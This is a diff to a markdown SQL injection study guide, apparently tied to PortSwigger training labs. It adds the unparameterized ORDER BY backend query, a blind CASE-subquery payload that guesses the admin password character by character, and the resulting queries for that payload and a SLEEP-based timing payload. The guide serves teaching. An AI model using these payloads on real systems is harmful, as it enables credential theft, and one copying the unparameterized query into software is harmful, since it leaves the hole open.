@@ -170,8 +170,22 @@ PortSwigger lab mapping (Apprentice): **"SQL injection vulnerability allowing lo
 
 ### 5.1 `ORDER BY` Clause Injection
 
+Backend query (unparameterized `$sort` dropped straight into the clause):
+
+```sql
+SELECT * FROM products ORDER BY $sort
+```
+
+Payload (the value sent as `$sort`):
+
 ```sql
 ?sort=(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN name ELSE id END)
+```
+
+Resulting query sent to the DB:
+
+```sql
+SELECT * FROM products ORDER BY (CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN name ELSE id END)
 ```
 
 Breakdown:
@@ -196,6 +210,8 @@ Breakdown:
 ```sql
 ?sort=name,(SELECT SLEEP(5))
 ```
+
+Resulting query: `SELECT * FROM products ORDER BY name,(SELECT SLEEP(5))`
 
 Breakdown: appends a second sort key that's a subquery; evaluating that subquery as part of
 determining sort order forces the `SLEEP(5)` call to execute regardless of the actual sort
